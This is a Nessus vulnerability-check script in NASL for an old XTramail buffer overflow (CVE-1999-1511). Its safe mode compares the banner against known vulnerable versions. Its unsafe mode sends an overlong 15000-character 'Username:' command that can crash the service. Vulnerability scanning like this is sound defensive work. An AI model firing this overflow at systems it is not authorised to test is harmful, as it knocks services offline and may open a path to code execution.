#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10323);
 script_bugtraq_id(791);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-1999-1511");
 
 name["english"] = "XTramail control denial";
 name["francais"] = "Déni de service control contre le MTA Xtramail";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "There is a buffer overflow
in the remote service when it is issued the 
following command :

	Username: (buffer)
	
Where 'buffer' is 15000 chars.

This problem may allow an attacker to
execute arbitrary code on this computer.

Solution : contact your vendor for a
patch.

Risk factor : High";


 desc["francais"] = "Il y a un dépassement
de buffer lorsque ce service recoit la commande :


	Username: (buffer)
	
Où buffer fait 15000 caractères.

Ce problème peut permettre à un pirate
d'executer du code arbitraire sur
votre machine.


Solution : contactez votre vendeur pour
un patch.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Overflows the remote server";
 summary["francais"] = "Overflow le serveur distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Misc.";
 family["francais"] = "Divers";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "sendmail_expn.nasl");
 script_require_ports(32000);
 exit(0);
}

#
# The script code starts here
#

port = 32000;

if(safe_checks())
{
 if(!get_port_state(port))exit(0);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 banner = recv_line(socket:soc, length:4096);
 close(soc);
 if(banner)
 {
  b = tolower(banner);
  if("xtramail" >< b)
  {
  if( ereg(pattern:".*1\.([0-9]|1[0-1])[^0-9].*",
   	string:b)
    )
    {
     data = "
The remote server is Xtramail 1.11 or older.
This version is known for being vulnerable to a buffer
overflow in the 'Username:' command.
	
This *may* allow an attacker to execute arbitrary commands
as root on the remote server.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : upgrade 
Risk factor : High";
     security_hole(port:port, data:data);
    }
  }
 }
 exit(0);
}
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = recv_line(socket:soc, length:1024);
  if ( ! s ) exit(0);
  c = string("Username: ", crap(15000), "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)security_hole(port);
  close(soc);
 }
}
